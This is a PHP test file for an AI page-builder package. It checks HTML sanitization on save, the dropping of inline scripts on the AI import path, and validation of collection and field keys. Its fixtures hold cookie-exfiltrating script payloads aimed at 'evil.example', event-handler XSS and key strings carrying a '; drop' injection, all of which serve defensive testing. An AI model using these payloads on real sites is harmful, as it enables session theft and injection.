<?php

declare(strict_types=1);

use Andre\AiPageBuilder\Ai\BuildPlanApplier;
use Andre\AiPageBuilder\Models\Page;
use Andre\AiPageBuilder\Models\PbField;
use Andre\AiPageBuilder\Models\PbModel;

// ---------------------------------------------------------------------------
// C3 — Page model sanitizes html on EVERY save (not just the AI path)
// ---------------------------------------------------------------------------

it('sanitizes page html on a direct (editor) save, stripping script while keeping markup', function (): void {
    $page = Page::query()->create([
        'title' => 'Editor save',
        'slug' => 'editor-save',
        'status' => 'draft',
        'kind' => 'page',
        'html' => '<section data-pb-block="hero"><h1>Hi</h1>'
            .'<script>steal(document.cookie)</script>'
            .'<img src="/logo.png" onerror="hack()"></section>',
    ]);

    expect($page->refresh()->html)
        ->not->toContain('<script')
        ->not->toContain('steal(')
        ->not->toContain('onerror')
        ->toContain('data-pb-block')
        ->toContain('<h1>')
        ->toContain('/logo.png');
});

it('does NOT sanitize custom_css / custom_js (the trusted-author escape hatch)', function (): void {
    $page = Page::query()->create([
        'title' => 'Custom assets',
        'slug' => 'custom-assets',
        'status' => 'draft',
        'kind' => 'page',
        'html' => '<p>body</p>',
        'custom_css' => 'body{background:url(javascript:none)}',
        'custom_js' => 'console.log("trusted author js");',
    ]);

    $page->refresh();

    // custom_* are emitted raw by design — they must survive untouched.
    expect($page->custom_js)->toBe('console.log("trusted author js");')
        ->and($page->custom_css)->toContain('javascript:none');
});

it('preserves a representative GrapesJS page: content survives, injected script/svg are removed', function (): void {
    // A representative GrapesJS export: sections with data-pb-block, classes,
    // declarative Alpine bindings (x-text / data-pb-*), an <img>, headings —
    // PLUS an injected <script>, an <svg onload>, and an onerror handler.
    $grapes = <<<'HTML'
        <section class="hero py-16" data-pb-block="hero">
            <h1 class="text-4xl font-bold" x-text="headline">Welcome</h1>
            <p class="lead" data-pb-bind="subtitle">Build pages with AI.</p>
            <img src="/assets/hero.png" alt="Hero" class="rounded-lg" />
            <a href="/signup" class="btn">Get started</a>
        </section>
        <section class="features grid" data-pb-block="feature_grid">
            <div class="card" data-pb-item="0"><h3>Fast</h3></div>
            <div class="card" data-pb-item="1"><h3>Secure</h3></div>
        </section>
        <script>fetch('https://evil.example/'+document.cookie)</script>
        <svg onload="alert(1)"><circle r="10"/></svg>
        <img src="x" onerror="alert(2)">
        HTML;

    $page = Page::query()->create([
        'title' => 'GrapesJS page',
        'slug' => 'grapes-page',
        'status' => 'draft',
        'kind' => 'page',
        'html' => $grapes,
    ]);

    $html = (string) $page->refresh()->html;

    // Legitimate GrapesJS output SURVIVES.
    expect($html)
        ->toContain('data-pb-block="hero"')
        ->toContain('data-pb-block="feature_grid"')
        ->toContain('data-pb-bind="subtitle"')
        ->toContain('data-pb-item="0"')
        ->toContain('x-text="headline"')
        ->toContain('class="hero py-16"')
        ->toContain('<h1')
        ->toContain('<h3>Fast</h3>')
        ->toContain('/assets/hero.png')
        ->toContain('href="/signup"');

    // Injected execution vectors are REMOVED.
    expect($html)
        ->not->toContain('<script')
        ->not->toContain('fetch(')
        ->not->toContain('onload')
        ->not->toContain('onerror')
        ->not->toContain('alert(');
});

// ---------------------------------------------------------------------------
// C3b — AI/import path drops inline <script> bodies (never lifts to custom_js)
// ---------------------------------------------------------------------------

it('does not move an inline <script> body into custom_js on the AI/import path', function (): void {
    $plan = [
        'pages' => [[
            'slug' => 'ai-page',
            'title' => 'AI Page',
            'status' => 'draft',
            'html' => '<section data-pb-block="hero"><h1>Hi</h1>'
                .'<style>.hero{color:red}</style>'
                .'<script>window.exfil=function(){fetch("//evil/"+document.cookie)}</script>'
                .'</section>',
        ]],
    ];

    $summary = app(BuildPlanApplier::class)->apply($plan);
    expect($summary['errors'])->toBe([]);

    $page = Page::query()->where('slug', 'ai-page')->firstOrFail();

    // The inline script JS must NOT be smuggled into the raw-emitted channel.
    expect((string) $page->custom_js)->not->toContain('exfil')
        ->and((string) $page->custom_js)->not->toContain('document.cookie');
    expect($page->custom_js)->toBeNull();

    // The <style> CSS is still lifted into custom_css (CSS-only lift kept).
    expect((string) $page->custom_css)->toContain('.hero{color:red}');

    // And of course the rendered html carries neither the script nor its body.
    expect((string) $page->html)
        ->not->toContain('<script')
        ->not->toContain('exfil');
});

// ---------------------------------------------------------------------------
// M1 — key charset enforced at the MODEL layer + plan validated on apply
// ---------------------------------------------------------------------------

it('rejects an invalid collection key at the model layer', function (): void {
    PbModel::query()->create([
        'key' => 'a-b; drop',
        'name' => 'Evil',
        'table_name' => 'pb_evil',
    ]);
})->throws(InvalidArgumentException::class);

it('rejects an invalid field key at the model layer', function (): void {
    $model = PbModel::query()->create([
        'key' => 'good_collection',
        'name' => 'Good',
        'table_name' => PbModel::physicalTableName('good_collection'),
    ]);

    PbField::query()->create([
        'model_id' => $model->id,
        'key' => 'bad; drop',
        'label' => 'Bad',
        'type' => 'string',
    ]);
})->throws(InvalidArgumentException::class);

it('accepts valid keys at the model layer', function (): void {
    $model = PbModel::query()->create([
        'key' => 'orders',
        'name' => 'Orders',
        'table_name' => PbModel::physicalTableName('orders'),
    ]);

    $field = PbField::query()->create([
        'model_id' => $model->id,
        'key' => 'total_amount',
        'label' => 'Total',
        'type' => 'string',
    ]);

    expect($model->exists)->toBeTrue()
        ->and($field->exists)->toBeTrue();
});

it('aborts apply on a build plan with an invalid collection key — nothing is written', function (): void {
    $plan = [
        'collections' => [[
            'key' => 'a-b; drop',
            'name' => 'Evil',
            'fields' => [
                ['key' => 'name', 'label' => 'Name', 'type' => 'string'],
            ],
        ]],
        'pages' => [[
            'slug' => 'home',
            'title' => 'Home',
            'status' => 'draft',
            'html' => '<h1>Hi</h1>',
        ]],
    ];

    $summary = app(BuildPlanApplier::class)->apply($plan);

    // Hard error reported, and the apply aborted: no collection metadata, no
    // table, and no page written.
    expect($summary['errors'])->not->toBeEmpty()
        ->and(implode("\n", $summary['errors']))->toContain('not a valid slug')
        ->and($summary['created']['collections'])->toBe([])
        ->and($summary['created']['pages'])->toBe([])
        ->and(PbModel::query()->where('key', 'a-b; drop')->exists())->toBeFalse()
        ->and(Page::query()->where('slug', 'home')->exists())->toBeFalse();
});

it('still applies a fully valid plan after the validation gate', function (): void {
    $plan = [
        'collections' => [[
            'key' => 'leads',
            'name' => 'Leads',
            'fields' => [
                ['key' => 'name', 'label' => 'Name', 'type' => 'string'],
            ],
        ]],
        'pages' => [[
            'slug' => 'home',
            'title' => 'Home',
            'status' => 'draft',
            'html' => '<section data-pb-block="hero"><h1>Hi</h1></section>',
        ]],
    ];

    $summary = app(BuildPlanApplier::class)->apply($plan);

    expect($summary['errors'])->toBe([])
        ->and($summary['created']['collections'])->toBe(['leads'])
        ->and($summary['created']['pages'])->toBe(['home'])
        ->and(PbModel::query()->where('key', 'leads')->exists())->toBeTrue()
        ->and(Page::query()->where('slug', 'home')->exists())->toBeTrue();
});
